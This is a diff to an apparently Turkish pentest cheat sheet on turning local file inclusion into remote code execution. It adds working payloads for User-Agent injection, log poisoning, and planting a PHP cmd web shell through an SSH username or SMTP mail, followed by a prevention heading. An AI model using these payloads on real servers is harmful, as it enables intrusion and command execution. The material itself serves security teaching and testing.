@@ -52,23 +52,44 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 
 # LFI to RCE
 ## /proc/self/environ Üzerinden RCE
-Bir log dosyası gibi çalışır. Payload User-Agent header'ına gönderilirse, bu değer /proc/self/environ içinde yansıtılır.
+Payload User-Agent header'ına gönderilirse, bu değer /proc/self/environ içinde yansıtılır.
 ```
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
 ## Log Dosyası üzerinden
-Payload servis log dosyasına enjekte edilirse ve daha sonra log dosyası LFI ile include edilirse.
+Payload servis log dosyasına enjekte edilirse.
 ```
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
 http://example.com/index.php?page=/var/log/nginx/access.log
 ```
 
-SSH üzerinden RCE
+## SSH Üzerinden RCE
+```bash
+ssh '<?php system($_GET["cmd"]);?>'@10.10.10.10
+```
 
-SSH girişini PHP kodu ile dene:
+SSH logları:
+```
+http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```
+
+# Mail Üzerinden RCE
+```telnet
+telnet 10.10.10.10 25
+mail from: mail@example.com
+rcpt to: root
+data
+subject: <?php echo system($_GET["cmd"]); ?>
+.
+```
+
+Alternatif:
+```
+mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10 < /dev/null
+```
 
 # LFI Açığını Önlemek
 ### Input Validation & Whitelisting
